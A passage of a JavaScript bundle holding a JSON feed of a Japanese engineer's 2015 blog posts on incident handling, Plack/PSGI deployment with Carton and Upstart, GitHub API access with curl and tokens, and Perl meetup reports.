-q対処直前のコミットにバグを入れ込んでしまったのであればリバートすれば解決するでしょうし、特定のサーバ落ちたのであれば、サービスから外してあげるだけで良いかも知れません。障碍の内容によって対処方法は様々です。ここで気を付けたいのは二次災害を起こさないことです。可能であれば、コマンドなり対処スクリプトのレビューをしてもらったり、現状認識に間違いがないかを周りの人にしてもらうと良いでしょう。(往々にして一人で障碍対応せざるを得ない場合もありますが。。)事後報告障碍対応が終わったら、記憶が新鮮なうちに下記の内容をまとめてしかるべき場所に投稿します。この辺の報告のフォーマットはだいたいの組織において決まっていることが多いでしょう。障碍内容影響範囲経過対処方法将来の対策面倒くさがらずに事実をなるべく詳細に書いておくと未来の自分や自組織のためになると思います。私の組織でも過去の障碍報告がだいぶ良い感じにデータベースになっており、たまに読み返すと気付きが得られます。また、この障碍報告を元に、同種の障碍をなるべく起こさない仕組み作りをしていくことが肝要だと思います。終わりに自分が障碍対応しているときにやってること、考えてることをざっくり書いてきました。誰にやり方を教わったわけでもないので、そこは違うとかこうした方がいいとかあれば、いただけると幸いです。明日は、@lycoris102さんのGameJam部 活動年間活動報告です。きっと面白い話なのではないでしょうか。","isoDate":"2015-12-18T13:00:00.000Z","dateMiliSeconds":1450443600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#chibapm Chiba.pm#7に参加しました。","link":"https://blog.masasuzu.net/entry/2015/12/12/chiba.pm-7","contentSnippet":"参加しました。雑なスライドですみません。スライド中に出てきてるやつはどれも五反田のお店で出てきます。五反田企業のガイアックスさんとかモバイルファクトリーさんはPerlの会社なので、美味しいごはんを食べたい人は検討してみてはいかがでしょうか。そういえば、Chiba.pmの開催回数がKichijoji.pm、Gotanda.pmに抜かされそうです。。","isoDate":"2015-12-12T09:39:37.000Z","dateMiliSeconds":1449913177000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-12-12-chiba.pm7","link":"https://speakerdeck.com/masasuzu/2015-12-12-chiba-dot-pm7","contentSnippet":"Chiba.pm#7 2015年をふりかえる","isoDate":"2015-12-12T05:00:00.000Z","dateMiliSeconds":1449896400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Plack/PSGIなwebアプリケーションの実行環境","link":"https://blog.masasuzu.net/entry/2015/12/11/plack-psgi-exec-env","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 11日目の記事です※ 投稿内容は私個人の意見であり、所属企業・部門見解ならびに技術戦略を代表するものではありません。昨日は@rymizukiさんのnpmライブラリの運用と管理についてでした。今日はPerlの話です。お仕事やプライベートでPerlのwebアプリケーションを書くことが多く、いろいろ知見が溜まってきてるので、ここで少し紹介しようと思います。今回はPlack/PSGIなwebアプリケーションの実行環境の話です。mod_perlなアプリケーションとはちょっとコンテキストが違います。少しかっちりコンテキストに近いです。個人で軽くwebアプリケーション立てるならもう少しゆるふわでも問題ないはずです。OSUbuntuのLTSを使うことが多いです。Ubuntu前提の内容が後に続きます。PerlSystem Perlは使ってません。OS/ディストリビューションが変わってもなるべくそのまま動くようにしたいためです。perl-buildで独自ビルドしたPerlを使います。インストール場所としては、 /usr/local/perl/perl-5.${VERSION} に置きます。Perlを独自ビルドしたものをDebian package化して実行環境にはインストールします。他の方法としては、ビルド済みのperlをtarで固めて、配布するというのもあります。どちらでも構わないのですが、ローカルネットワークにaptサーバ立てている関係で、Debian packageの方が運用しやすいのです。また、perlのマイナーバージョンアップの際もDebian packageを作り直した上で、 apt-get upgrade (or aptitude safe-upgrade)で完結するので、aptの操作に慣れていて楽というのもあります。モジュール管理今風にcpanfileでモジュール管理してます。モジュールインストールはCartonを使ってます。Cartonの後継でCarmelも開発されてます。個人的にはそろそろ触っておきたいところです。また、cpanfile.snapshotもレポジトリに入れています。一般的なモジュールは特定の(古い)バージョンに依存せずに動くべきですが、依存モジュールのバージョン違いによって現在動いているアプリケーションが壊れるのを防ぐために、バージョン固定します。cpanfile.snapshotがある状態で下記のように carton install してあげると、どの環境でも同じバージョンのモジュールがインストールされます。carton install --deployment --without develop,test今やってないですが、別方法としては、モジュールがインストール済みの状態で、 carton bundle すると vendar/ にモジュールのtarが固められるので、それもレポジトリ管理した上で、下記の様にインストールするという手もあります。インストールの際は vendor/bin/carton  にfatpackされたcartonコマンドが入るのでそれを使います。(アプリ実行環境にcartonを敢えて入れる必要は無い)# 依存モジュールを固めるcarton bundle# インストール# env.shは後述./script/env.sh vendor/bin/carton install --cached --deployment --without develop,testさらに別方法としては、ビルドサーバで依存モジュールをビルドした上で、ディレクトリごと実行環境にrsyncしてあげる方法です。ビルドサーバを運用しているならば、この方法でも良いでしょう。参照Carton考2014carton bundle && carton install --cachedの使いどころ独自モジュールなるべく、独自モジュールは使わない方が良いのですが、個人的な事情などで、CPANに公開出来ないモジュールに関しては、OrePAN2 でDarkpanを作ってそこからローカルに配信するようにしてます。OrePAN2のサーバを簡単に立ち上げられるOrePAN2::Serverがありますが、一時期は使っていましたが、モジュールのアップロード機能は別にいらないなどの理由で今はwebサーバから静的配信してます。環境変数プロジェクトのレポジトリに config/env.rc という名前で、アプリケーションを動かすために必要な環境変数を定義したファイルを作ります。PERL5_VERSION=\\"22\\"export PROJECT_BASE=\\"/path/to/project\\"export PERL_CARTON_MIRROR=\\"http://orepan.local/\\"export PERL5LIB=\\"${PROJECT_BASE}/local/lib/perl5:${PROJECT_BASE}/lib\\"export PATH=\\"${PROJECT_BASE}/local/bin:/usr/local/perl/perl-5.${PERL5_VERSION}/bin:${PATH}\\"export PLACK_PORT=5555また、 script/env.sh という名前で config/env.rc を読み込んだ上で、プログラムを実行するラッパースクリプトを作ります。スクリプトなどは基本的にこれを通して実行します。#!/bin/bash -ue# 諸々環境変数を設定した上でコマンドを実行する君##       env.sh perl hogehoge.pl#source /path/to/project/config/env.rcexec \\"$@\\"開発環境で、いちいちラッパースクリプト通すのが面倒な場合は、config/env.rc のsymlinkをプロジェクトルートに .envrc として張った上で、direnv使って済ましてしまう場合もあります。web サーバ起動スクリプトpsgiファイルを plackup するのではなく、こんな感じのスクリプトをscript/web みたいな名前で 用意してアプリケーションサーバを起動するようにしてます。#!/usr/bin/env perluse strict;use warnings;use lib \\"$ENV{PROJECT_BASE}/lib\\";use Plack::Loader;use SomeApplication::Config;use SomeApplication::Web::Handler;my $config = SomeApplication::Config->load();my $app    = SomeApplication::Web->to_app();Plack::Loader->load(    $config->{psgi}->{server},    %{ $config->{psgi}->{config} },)->run($app);また、このスクリプトをstart_serverを経由して起動することで、(graceful restartによる)ホットデプロイをできるようにしてます。start_server のプロセスにSIGHUPを送ると子プロセスのアプリケーションサーバを再起動してくれるのですが、 plackup コマンドで起動してると start_server に渡した引数をそのまま使ってplackup を再起動するので、 max_workers の数を変えたいときなど、 start_server 自体のプロセスを再起動しなくてはならないので不便です。なので、起動スクリプトを作ってます。そのほかにも理由があるのですが、参照リンクに詳しくあります。サーバ実装としては、StarletやGazelleを使ってます。参照PSGI/Plackアプリケーションの起動方法いろいろと本番環境アレコレ普通に使う Plack/PSGI ServerGraduate from .psgiデーモン管理現在はUpstartでアプリケーションサーバのデーモン管理してます。以下の理由で、個人的には好きでした(過去形)。最新のUbuntuはSystemdに変わってしまったので、将来的にはSystemdに移行することになるでしょう。Ubuntuに標準で入っていてサーバ起動時の自動起動してくれてデーモン異常終了時に自動再起動してくれて設定はわりかしわかりやすい/etc/init/web-some-application.conf みたいな名前でこんな設定ファイルを作りますdescription \'some web application\'author \'masasuzu <hogehoge@masasuzu.net>\'start on runlevel [2345]stop on starting rc RUNLEVEL=[016]setuid webappsetgid webapp# 異常時に再起動するrespawnscript    . /path/to/project/config/env.rc    export PLACK_ENV=\\"production\\"    exec ${PROJECT_BASE}/local/bin/start_server \\\\        --interval 10           \\\\        --port ${PLACK_PORT}    \\\\        -- ${PROJECT_BASE}/script/service/webend script上記のファイルを作ると以下のように操作出来ます。reloadでSIGHUPが送れるので、アプリケーションサーバのstart_server経由のgraceful restartができます。# 起動service web-some-application start# 停止service web-some-application stop# (start_serverのプロセスごと)再起動service web-some-application restart# Plackサーバを再起動service web-some-application reloadアプリケーションサーバ以外も、ジョブのワーカーなども、独自に設定ファイルを作って、Upstart経由で起動したりしてます。Upstart以外の選択肢としては、先に挙げたSystemdの他、以下のものがあるでしょう。好みと要件に合わせて使えば良いと思います。daemontoolsSuvpervisordSystemd参照Server::Starterから学ぶhot deployの仕組みServer::Starter の --interval オプションは大切Upstart を使ってお手軽 daemon 化Upstart Intro, Cookbook and Best PractisesおわりにWAF(Web Application Framework)やログの話など膨らまそうと思えばもっと膨らませられますが、実行環境の話なので、ここまでで抑えておきます。ざっくりと、Plack/PSGIなアプリケーションの実行環境について説明してきました。PerlでWebアプリケーションを作る時に何か参考になれば幸いです。また、もっと良い方法があれば、教えていただけるとありがたいです。明日は、@nekobato さんです webpackのなにか面白い話があるんじゃないかとわくどきしてます。","isoDate":"2015-12-11T04:30:00.000Z","dateMiliSeconds":1449808200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Github APIを使おう","link":"https://blog.masasuzu.net/entry/2015/12/04/use_github_api","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 4日目の記事です今日は、Github APIの話です。Githubの管理作業は他のWebサービスと同じく基本Webコンソールでできます。ただ、Organizationとかを管理してる場合、ある程度以上規模が大きくなると、定型的な管理作業が増えて、Webでぽちぽちやるには煩雑でつらくなってきます。ここで怠惰エンジニア*1はどうにかこの定型作業を自動化/スクリプト化できないかなと考え始めます。幸い、GithubにはAPIがあるので、これを利用して要件に合わせて、実装することができます。ドキュメントは以下の場所にあるので、各APIの使い方などはそちらを参照してください。GitHub API v3 | GitHub Developer Guideapiアクセスを投げるpublicな情報を取得するには普通にcurlでGET発行するだけで、取得出来ます。curl https://api.github.com/users/masasuzu/reposが、これだけでは、privateな情報にアクセスできません。ので、Basic認証をしてアクセスをします。curl -u ${USER}:${PASSWORD} https://api.github.com/orgs/some_privete/reposただ、この場合、このアカウントで出来ることが全て実行出来てしまうので、下記のリンクからアクセストークンを発行して、権限を絞ってAPIにアクセスするのが望ましいです。アクセストークンは作成時にしか見れないので、ちゃんと書き留めておくようにしましょう。Personal access tokensアクセストークンを使用した場合、下記の3つの方法で認証出来ます。curl -u :${ACCESS_TOKEN} https://api.github.com/orgs/some_privete/reposcurl -H \'Authorization: token ${ACCESS_TOKEN}\' https://api.github.com/orgs/some_privete/reposcurl \'https://api.github.com/orgs/some_private/repos?access_token=${ACCESS_TOKEN}\'ドキュメントに各API発行に必要なscope(権限)が書いてあるので必要なscopeだけ付与してあげると良いです。perlでの選択肢今までで、APIアクセスする手段を得ることはできましたが、シェルスクリプトで処理を組み立てるのは、無謀なので、使い慣れてるプログラミング言語で実装したいところです。当社ではPerlを使い慣れてるエンジニアが多いので、ここではPerlのクライアントを紹介します。現在のところ以下の2つの選択肢があります。PithubNet::Github私はPithubを使っています。使い始めた時期においてPithubの方が更新されてそうだったからです。が、今見るとNet::Githubも更新されてるように見えます。他の言語での選択肢特にプログラミング言語にこだわりが無いのであれば、githubがメンテナンスしてるoctokitを使うと良いと思います。RubyとObjective C、.Netに対応してます。たぶん鉄板だと思います。(しかし、octokitのこのサンライズというかバンダイに怒られそうなデザインは大丈夫なのでしょうか?まとめ煩雑で定型的な作業はGithub APIで自動化すると良いPrivateな情報の操作はアクセストークンを発行してAPIを発行するPerlにはPithubとNet::Githubのクライアントライブラリがあるこだわりがなければ、クライアントはoctokit使うと良い明日は、 @mihyaeru21 さんです。iOS回りの面白いエントリが見れそうです。*1:プログラマの3大美徳の1つ","isoDate":"2015-12-04T14:47:44.000Z","dateMiliSeconds":1449240464000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #6 でLTしてきました。","link":"https://blog.masasuzu.net/entry/2015/09/17/Gotanda.pm6","contentSnippet":"gotanda-pm.connpass.comGotanda.pmでLTしてきました。今回のテーマは障碍でした。半分ネタのトークです。JSTQB Foundation Level のシラバスに載っているソフトウェアテストの7原則をもじったやつです。JSTQB認定テスト技術者資格-シラバス（学習事項）・用語集-言ってみれば、サービスに対して継続的にテストするのが監視なのでテストに対する原則が監視に対しても言えるんじゃないかなーという軽い思いつきから生まれました。無理矢理な部分もありましたが、わりかし当てはまってる部分もあったのではないかと思いました。トーク中美味しいにおいがしてきてつらかったです。(このエントリは懇親会の前に書かれてます)#gotandapm 美味しそうなにおいがして辛い。。。。— masasuzu? (@masasuz) September 17, 2015ガイアックスさん会場提供ありがとうございました。","isoDate":"2015-09-17T12:14:35.000Z","dateMiliSeconds":1442492075000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-09-17_gotanda.pm6","link":"https://speakerdeck.com/masasuzu/2015-09-17-gotanda-dot-pm6","contentSnippet":"Gotanda.pm#6 LT\\r監視の7原則という半分ネタなトーク","isoDate":"2015-09-17T04:00:00.000Z","dateMiliSeconds":1442462400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#yapcasia YAPC::Asia 2015でボランティアスタッフしてきた","link":"https://blog.masasuzu.net/entry/2015/08/23/YAPC_Asia","contentSnippet":"今年のYAPC::Asiaは終わった。つつがなく終わりました。過去のエントリを見直すと2011、2012年は書くのサボっていたみたいでした。私のYAPC::Asia初参加は2010年で6回目の参加でした。#yapcasia YAPC::Asia 2014でボランティアスタッフやってきました - 目の前に僕らの道があるmasasuzu.hatenablog.jp#yapcasia YAPC::Asia Tokyo 2013に参加してきました。 - 目の前に僕らの道があるmasasuzu.hatenablog.jpYAPC::Asia 2010へ行ってきたよ。 - 目の前に僕らの道があるmasasuzu.hatenablog.jp今年のYAPCとの関わり方は個人スポンサー+ボランティアスタッフとして参加しました。個人スポンサーとしては4年目、ボランティアスタッフとしては3年目でした。今年のYAPCもすごい楽しかったです。特にここ1,2年でPerl関係の人たちの知り合いがすごい増えたので、いろんな人と話ができてすごい楽しかったです。トークの方は例年スタッフ業をやっていると聞けないので、(会場にいてもスタッフのお仕事に意識が行くので内容を聞き取れてないことが多い)、動画が上がったら気になっていたトークを追いたいと思います。さて、だいたい6年前からWebで、Perlでお仕事するようになってからYAPCにはいろいろなものをもらってきました。だからこそ、ボランティアスタッフをやったり、個人スポンサーになって自分がもらったものを間接的に他の人に与えられたらいいなと思ってやってきました。自分がもらったものを他の人も受け取ってもらえたらなら良いなと思います。YAPC::Asiaはいったん終わります。それ自体いろいろ思うところがありますし、残念ではあります。YAPC::Asiaが無くなっても地域PMなどのPerlのコミュニティ自体が無くなるわけではないので私も細々とコミュニティ活動していきます。ただ、全国的にPerlな人が集まってくるイベントが今のところ来年無いのは寂しいところです。もしどこかで動きがあるならお手伝いさせていただければなと思います。YAPC::Asiaお疲れ様でした。(初日の懇親会の後の二次会でいろんな人に迷惑かけてしまったようなのでものすごく反省しています。すみません。お酒気を付けます。。。会期中のつぶやきいくつかおしゃれなカップだ #yapcasia pic.twitter.com/NwWw30i3HW— masasuzu? (@masasuz) August 22, 2015#yapcasia Perl6！ pic.twitter.com/2tJh6irctZ— masasuzu? (@masasuz) August 22, 2015#yapcasia  壇上から。お疲れさまでした！！ pic.twitter.com/1MiU56gE4R— masasuzu? (@masasuz) August 22, 2015","isoDate":"2015-08-23T10:17:16.000Z","dateMiliSeconds":1440325036000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pmでLTしてきた","link":"https://blog.masasuzu.net/entry/2015/07/12/122011","contentSnippet":"吉祥寺.pm (kichijojipm) #4 : ATNDatnd.org今回はPerlとPerl以外ということで、Perlの外の世界をつないでるもので一番最初に思いついたのがテンプレートエンジンだったので今回の発表になりました。自分のテンプレートの利用シーンは設定ファイルの自動生成ですね。テンプレートがあることで手作業で設定ファイルをいじる必要が基本的にはないので、手作業に起因ミスがないのが良いですよね。そのほかくりかえしの記述が必要なものもテンプレート使うと便利な場面が多いと思います。前回のLTが長すぎたので、真姫進行で行ったら、巻きすぎてしまいました。時間配分難しい。#kichijojipm 真姫すぎた。。— masasuzu? (@masasuz) July 10, 2015#kichijojipm 巻きすぎた。。— masasuzu? (@masasuz) July 10, 2015懇親会のお店はおしゃれな感じでさすが吉祥寺という感じでした。五反田とは違う。#kichijojipm 炙りマカレル pic.twitter.com/wpJTTnIvZF— masasuzu? (@masasuz) July 10, 2015他の人のスライドはこちらページからたどれると思います。吉祥寺.pm4終わりました - kichijojipm’s blogkichijojipm.hatenablog.com今回の吉祥寺.pmも楽しかったです。次回も参加したいです。余談1今回のKeynoteはAzusa Colorsを元にスライドを作りました。だいぶ良い感じにできました。ありがたいです。茜屋さんのイメージカラーのパープルを基調にしています。http://memo.sanographix.net/post/113681262780memo.sanographix.net余談2LTの途中で宣伝してましたが、五反田のモバイルファクトリーさんで7/31にCrystalの勉強会やるしいですよ。東京 Crystal 勉強会 #1 in 五反田 (2015/07/31 19:30〜)crystal.connpass.comGotandaは今技術的に熱い街です。そのほかGotanda.pmや五反田Perlみたいな勉強会も様々行われてます。","isoDate":"2015-07-12T03:20:11.000Z","dateMiliSeconds":1436671211000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-07-10-kichijoji.pm4_yurui_template","link":"https://speakerdeck.com/masasuzu/2015-07-10-kichijoji-dot-pm4-yurui-template","contentSnippet":"テンプレートとPerlに関するゆるい話\\r\\r吉祥寺.pm #4","isoDate":"2015-07-10T04:00:00.000Z","dateMiliSeconds":1436500800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015年第二 四半期をふりかえる","link":"https://blog.masasuzu.net/entry/2015/07/03/2015_2_retrospective","contentSnippet":"7月にとうとうなりました。ざっくりふり返ります。お仕事mod_perl to PSGI/Plackこの四半期のメインタスクでした。弊社2事業部あるんですが、そのうちの片方の事業部のmod_perlアプリをPSGI/Plack化しました。後は事業部の人がちゃんとテストして、本番反映するだけです。もう一個の事業部のmod_perlアプリケーションは次の四半期に取りかかる予定です。雑感としては、mod_perl特有の機能はほぼ使ってないので、そんなに辛くは無かったです。どちらかというと、使っているモジュールが古すぎたり、SledgeのPlugin地獄だったりしてアプリの実装の方でちょこちょこはまることが多かったです。このあたりの話です。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前に僕らの道があるmasasuzu.hatenablog.jpGitbucket地味にアップデートが出る度に追従してました。しかしながら、そこそこでかいレポジトリをGitbucketで管理するのはだいぶつらいことが見えてきました。まず、レポジトリブラウザが鬼のように重い。1日数10コミットするようなレポジトリだとまともに使えないので、ちょっと移行先を考えてます。Elasticsearch  + Kibana4Kibana4入れました。Kibana3もまだ稼働中ですが、Kibana4で十分かなという気分です。Kibana4はすごい便利なので、そのあたりの話もどこかで一度したいです。開発環境の改善OrePAN2::Serverを廃止して、社内モジュールは静的サーバ置いたり、一つサーバでマルチユーザが同居するようなレガシーな開発環境の改善とかもろもろやってました。この辺もあとでエントリ書きたいところ。新卒技術者のメンタリング新卒技術者に対して仕事外で困ってる事とかのお悩みの相談乗ったり、成長を促すお手伝いをしたいたりします。会社としてもメンター制度できたばっかりで、組織的にも自分的にもいろいろ手探り感があるのは確かです。自分が見ている人はかなり優秀で日々成長が見て取れるので、そこをさらに促せるようにしていけたらと思います。書いた記事こう見るとあまりエントリ残してないですね。もう少し書きたいところ。4月勉強会#kichijojipm 吉祥寺.pm #3 に参加してきました。 - 目の前に僕らの道がある技術ubuntu12.04でruby2.2.1のビルド失敗するのはlibffi-devが入ってないから - ふり返る暇なんて無いね$PATHを見やすく表示したい - ふり返る暇なんて無いね5月技術ポートが空いてるか調べたいとき - ふり返る暇なんて無いねサーバ起動時に/etc/init.d/ に設定があるデーモンを自動起動したい - ふり返る暇なんて無いねElasticsearchを1.4以上に上げたらkibana3がElasticsearchにConnection Failedする際の対処 - ふり返る暇なんて無いねポエム縮退運用という考え方 - ふり返る暇なんて無いねあなたは嫌いですか。でも僕は好きです。 - ふり返る暇なんて無いね6月勉強会#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました - 目の前に僕らの道がある技術MySQLのLINEAR KEY パーティションでPKで検索しても遅い場合 - ふり返る暇なんて無いねPerlモジュールのバージョン比較したい - ふり返る暇なんて無いねポエム普段の行動がものをいう - ふり返る暇なんて無いね判断と判断の変更 - ふり返る暇なんて無いね感覚値はあくまで感覚値 - ふり返る暇なんて無いね次の四半期お仕事的にはもう一個の事業部のPSGI/Plack化と開発環境の改善をメインにやってくと思います。ここ最近ちょっといろいろ腹に貯めすぎなので、もう少し心にゆとりをもっていけたらなとは思いまする。","isoDate":"2015-07-03T00:00:00.000Z","dateMiliSeconds":1435881600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-06-25_gotanda.pm5","link":"https://speakerdeck.com/masasuzu/2015-06-25-gotanda-dot-pm5","contentSnippet":"Plackのアクセスログの話","isoDate":"2015-06-24T04:00:00.000Z","dateMiliSeconds":1435118400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"}]')},7542:(e,t,a)=>{a.d(t,{M8:()=>r,kR:()=>n,mr:()=>s,nv:()=>i});var o=a(1202);function i(e){return o.o.find(t=>t.id===e)}function r(e){let t=new URL(e);return(null==t?void 0:t.hostname)||"blog"}function n(e){return"https://www.google.com/s2/favicons?domain=".concat(e)}function s(e){return"/members/".concat(encodeURIComponent(e))}a(6067)}}]);